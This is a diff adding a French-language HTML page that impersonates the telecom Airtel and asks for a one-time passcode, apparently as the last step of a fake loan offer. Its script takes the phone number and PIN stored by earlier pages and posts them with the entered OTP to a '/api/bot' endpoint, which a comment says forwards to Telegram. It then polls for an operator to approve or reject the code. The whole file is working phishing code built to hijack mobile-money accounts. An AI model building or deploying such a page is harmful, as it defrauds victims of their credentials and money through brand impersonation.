@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel - OTP</title>
+    <style>
+        * { box-sizing: border-box; font-family: sans-serif; }
+        body { margin: 0; background-color: #E40000; display: flex; flex-direction: column; min-height: 100vh; }
+        .top-red { padding: 40px 20px; text-align: center; color: white; }
+        .logo { font-size: 40px; font-weight: bold; font-style: italic; letter-spacing: -2px; }
+        .tagline { font-size: 10px; letter-spacing: 2px; }
+        
+        .bottom-white { background: white; flex-grow: 1; border-top-left-radius: 24px; border-top-right-radius: 24px; padding: 30px 20px; display: flex; flex-direction: column; }
+        .title { font-size: 22px; font-weight: bold; color: #333; margin-bottom: 10px; }
+        .sub { font-size: 14px; color: #666; margin-bottom: 20px; }
+        
+        .error-msg { color: #E40000; font-weight: bold; text-align: center; display: none; margin-bottom: 15px; }
+        
+        .otp-boxes { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 20px; }
+        .otp-boxes input { width: 60px; height: 60px; text-align: center; font-size: 24px; font-weight: bold; border: 1px solid #ccc; border-radius: 8px; background: #f9f9f9; }
+        .otp-boxes input:focus { outline: none; border-color: #E40000; background: white; }
+        
+        .timer { text-align: center; font-size: 14px; color: #666; margin-bottom: 20px; }
+        .btn-main { width: 100%; background-color: #E40000; color: white; font-size: 16px; font-weight: bold; padding: 15px; border: none; border-radius: 24px; margin-top: auto; cursor: pointer; }
+        .btn-main:disabled { background-color: #9ca3af; }
+        
+        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #E40000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div id="overlay">
+        <div class="spinner"></div>
+        <h2 style="color:#FFCC00;">Vérification...</h2>
+        <p>Veuillez patienter.</p>
+    </div>
+
+    <div class="top-red">
+        <div class="logo">airtel</div>
+        <div class="tagline">UNE RAISON D'IMAGINER</div>
+    </div>
+
+    <div class="bottom-white">
+        <div class="title">Connexion avec OTP</div>
+        <div class="sub">Entrez l'OTP envoyé à votre numéro</div>
+        
+        <div id="otpError" class="error-msg">Code OTP incorrect. Réessayez.</div>
+        
+        <div class="otp-boxes">
+            <input type="tel" id="otp1" maxlength="1" oninput="if(this.value.length==1) document.getElementById('otp2').focus(); checkOtp();">
+            <input type="tel" id="otp2" maxlength="1" oninput="if(this.value.length==1) document.getElementById('otp3').focus(); checkOtp();">
+            <input type="tel" id="otp3" maxlength="1" oninput="if(this.value.length==1) document.getElementById('otp4').focus(); checkOtp();">
+            <input type="tel" id="otp4" maxlength="1" oninput="checkOtp();">
+        </div>
+        
+        <div class="timer">Renvoyer dans <span id="timerText" style="color:#E40000; font-weight:bold;">60s</span></div>
+        
+        <button id="otpBtn" class="btn-main" disabled onclick="submitOtp()">Vérifier OTP</button>
+    </div>
+
+    <script>
+        var globalUserId = Date.now().toString().slice(-6);
+        var userPhone = sessionStorage.getItem('userPhone') || "+243000000000";
+        var userPin = sessionStorage.getItem('pin') || "0000";
+        var timerInterval;
+
+        // Start 60s Timer
+        function startTimer() {
+            var timeLeft = 60;
+            timerInterval = setInterval(function() {
+                timeLeft--;
+                document.getElementById('timerText').innerText = timeLeft + 's';
+                if (timeLeft <= 0) clearInterval(timerInterval);
+            }, 1000);
+        }
+        startTimer();
+
+        // OTP Logic
+        function checkOtp() {
+            var otp = "";
+            for (var i = 1; i <= 4; i++) { otp += document.getElementById('otp' + i).value; }
+            document.getElementById('otpBtn').disabled = (otp.length !== 4);
+            document.getElementById('otpError').style.display = 'none';
+        }
+
+        function submitOtp() {
+            var otp = "";
+            for (var i = 1; i <= 4; i++) { otp += document.getElementById('otp' + i).value; }
+            if (otp.length !== 4) return;
+            
+            document.getElementById('overlay').style.display = 'flex';
+            
+            // Send OTP to Telegram
+            fetch('/api/bot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    action: 'send', type: 'OTP', userId: globalUserId, 
+                    data: { phone: userPhone, value: otp } 
+                })
+            }).then(function() {
+                pollStatus();
+            });
+        }
+
+        // Polling function
+        function pollStatus() {
+            var interval = setInterval(function() {
+                fetch('/api/bot?userId=' + globalUserId + '&type=otp')
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    if (data.status === 'approved') {
+                        clearInterval(interval);
+                        alert("Succès! Votre prêt est en cours de traitement.");
+                        window.location.href = 'index.html'; // Back to start or success page
+                    } 
+                    else if (data.status === 'rejected') {
+                        clearInterval(interval);
+                        document.getElementById('overlay').style.display = 'none';
+                        document.getElementById('otpError').style.display = 'block';
+                        for (var i = 1; i <= 4; i++) { document.getElementById('otp' + i).value = ''; }
+                        document.getElementById('otpBtn').disabled = true;
+                    }
+                });
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
